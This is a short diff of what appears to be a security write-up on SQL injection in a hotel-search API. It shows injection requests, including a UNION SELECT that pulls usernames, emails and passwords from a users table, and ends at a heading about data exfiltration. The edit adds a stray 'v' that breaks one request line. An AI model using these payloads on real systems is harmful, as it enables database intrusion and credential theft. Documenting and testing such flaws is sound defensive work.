@@ -221,7 +221,7 @@ def get_hotels():
 ```
 GET /api/hotels?city=New' OR '1'='1
 GET /api/hotels?city='
-GET /api/hotels?city=' UNION SELECT id, username, email, 0, password, 0, '', created_at FROM users --
+vGET /api/hotels?city=' UNION SELECT id, username, email, 0, password, 0, '', created_at FROM users --
 ```
 
 **Exploit Payload Example 1 - Data Exfiltration**:
